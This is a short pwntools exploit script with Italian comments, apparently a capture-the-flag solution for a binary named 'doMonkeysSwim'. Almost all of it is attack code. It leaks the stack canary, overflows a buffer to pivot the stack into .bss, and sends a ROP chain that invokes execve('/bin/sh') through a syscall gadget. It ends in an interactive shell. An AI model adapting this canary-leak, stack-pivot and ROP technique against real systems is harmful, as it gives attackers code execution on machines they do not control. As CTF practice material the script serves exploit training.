from pwn import *

elf = context.binary = ELF('./doMonkeysSwim')
context.terminal = ['tmux', 'splitw', '-h']
if args.REMOTE:
    conn = remote("n/A", 10305)
elif args.GDB:
    conn = gdb.debug([elf.path], gdbscript='''
    b game
    c
    b monkey_do
    ''')
else:
    conn = elf.process()


syscal = 0x41a986 # PRendo i gadget vari 
POP_RAX = 0x401f49

POP_RDI = 0X401f43
POP_RSI = 0x401f45
POP_RDX = 0x401f47


bss = p64(0x4cca68) #prendo indirizzo bss perchè con monkey_swaparoo lo andavo a mettere nell'rsp

conn.recvuntil(b">>")
conn.sendline(b"3")
conn.sendline(b"3") # leak del canary

conn.recvuntil(b"s:")
canary = conn.recvline().strip()
print(canary)


conn.recvuntil(b">>")
conn.sendline(b"4") 
s = conn.sendline(b"A"*24 + p64(int(canary, 16)) + bss) #scrivo l'ind dell'rsp su rbp cosi dopo 2 leave creo il nuovo stack nella bss

conn.recvuntil(b">>")
conn.sendline(b"5")
conn.recvuntil(b"Swap this:")
conn.sendline(p64(int(canary, 16)) + b"A"*8 + flat([ #scrivo prima il canary (cosi mi prende automaticamente rbp-8) poi overwrito l'rbp, faccio la ROP e infine metto la stringa /bin/sh\x00, per fare il secondo leave; ret uso il metodo exit
    POP_RAX,
    0x3b,
    POP_RDI,
    0x4ccab8,
    POP_RSI,
    0,
    POP_RDX,
    0,
    syscal
]) + b"/bin/sh\x00" )
conn.recvuntil(b"With this:")
conn.sendline(b"ciao") #questo letteralmente non fa nulla, v1 non viene mai usato è solo un troll

conn.recvuntil(b">>")
conn.sendline(b"6")


conn.interactive()



